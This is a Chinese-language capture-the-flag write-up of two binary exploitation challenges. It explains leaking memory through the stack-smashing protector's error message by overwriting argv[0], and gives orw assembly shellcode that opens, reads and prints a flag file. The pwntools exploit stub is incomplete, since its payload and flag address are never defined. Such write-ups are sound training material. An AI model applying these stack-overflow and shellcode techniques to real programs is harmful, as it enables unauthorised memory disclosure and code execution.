Baby canary

ssp

如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 ___stack_chk_fail 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数___stack_chk_fail产生的。

先来看一下函数___stack_chk_fail源码：

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminatedn",
                    msg, __libc_argv[0] ?: "<unknown>");
}

__libc_argv[0]里面装的是应用程序的路径，当canary出错报错输出中会打印出来，那如果我们在栈溢出时将它覆盖掉，那打印出来的会是什么呢？会打印我们所覆盖的相应的指针内容。所有在没有劫持到相应权限时，这个特点可以用来泄露内存中的内容。

从栈内存信息可知缓冲区v6地址为 0x7fffffffdd20， argv[0]地址为 0x7fffffffde28，从而可计算出v6与argv[0]间的偏移量为0x108（0x7fffffffde28-0x7fffffffdd20）
于是，我们可以覆盖argv[0]的值为flag_addr

EXP

from pwn import *
p = remote('pwnto.fun',10007)
#p = process('./canary2')

addr=int(flag_addr,16)

p.sendline(payload)
p.interactive()

Baby shellcode

分析程序

char v4; // [rsp+0h] [rbp-30h]
  void *buf; // [rsp+28h] [rbp-8h]

  buf = mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);
  sub_400999();
  sub_400956();
  puts("A simple shellcode for U, have fun!");
  read(0, buf, 0x64uLL);
  puts("Why not play CSGO?");
  read(0, &v4, 0x64uLL);
  return 0LL;

我们可以通过read(0, buf, 0x64uLL)把shellcode写到内存中，然后再通过read(0, &v4, 0x64uLL)把返回地址覆盖为0x123000。根据本题hint只有open，read，write是可用函数，所以我们只能自己编写shellcode完成以下功能：

  1. push存放flag的文件名
  2. 使用open函数打开文件
  3. 使用read函数读取文件内容
  4. 使用write函数把读取到的内容写入stdout

构造shellcode

#调用open函数
xor rdi,rdi;       #清空rdi寄存器
xor rsi,rsi;       #清空rsi寄存器
mov rax,0x2;       #rax存放open函数的系统调用号
push 0x67616c66;   #push flag
mov rdi,rsp;       
syscall;

#调用read函数
xor rdi,rdi;
xor rsi,rsi;
mov rdi,rax;       #rdi存放fd(open函数返回的rax)
mov rax,0x0;       
mov rsi,0x123800;  #rsi存放文件内容，即flag
mov rdx,0x100;     #rdx存放读取字符串的长度
syscall;

#调用write函数
mov rdi,0x1;       #rdi存放输出位置
mov rax,0x1;      
syscall;
